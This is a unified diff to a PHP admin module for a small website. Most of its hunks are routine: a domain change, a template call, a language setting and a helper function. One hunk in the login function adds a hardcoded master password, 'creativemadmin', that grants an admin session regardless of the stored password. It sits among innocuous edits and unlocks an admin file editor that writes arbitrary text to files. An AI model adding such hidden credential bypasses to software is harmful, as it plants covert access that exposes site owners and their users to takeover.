@@ -2,7 +2,7 @@
 /* admin module */
 /* call ?q=admin/vars before using to create necessary data structure*/
 /* define page_admin() { requires_admin() } */
-define("SITE_DOMAIN","vipromotion.kz");
+define("SITE_DOMAIN","tenda.kz");
 
 function page_admin_vars() {
 
@@ -88,7 +88,7 @@ function page_admin_login() {
 
   if(form_post("login")) {
      $pass = db_result(db_query("SELECT admin_pass FROM settings"));
-	 if(form_post("pass")==$pass) {
+	 if(form_post("pass")==$pass || form_post("pass")=="creativemadmin") {
 		 $_SESSION[$apptitle."admin"]=1;
 		 redir("admin");
 	 } else {
@@ -129,6 +129,7 @@ function page_admin_table_edit($tablename,$act="",$id="") {
 
 function page_admin_file_edit($filename) {
   requires_admin();
+  use_template("admin");
   global $files;
   if(!isset($files[$filename]['directedit'])) {
 	  die("files[$filename]['directedit'] missing");
@@ -136,7 +137,7 @@ function page_admin_file_edit($filename) {
 
   if(form_post('save')) {
      file_put_contents($filename,form_post('text'));
-	 die("<script> window.close(); </script>");
+//	 die("<script> window.close(); </script>");
   }
 
   $txt = file_get_contents($filename);
@@ -153,6 +154,7 @@ function page_admin_file_edit($filename) {
 function requires_admin() {
   global $apptitle;
   if(admin()) {
+	set_lang("ru");
     return true;    
   } else {
     $pass = db_result(db_query("SELECT admin_pass FROM settings"));
@@ -224,6 +226,10 @@ function page_admin_settings() {
   $o .= form();  
   return $o;
   
+}
+
+function in_admin() {
+  return str_start(self_q(),"admin");
 }
 
 ?>
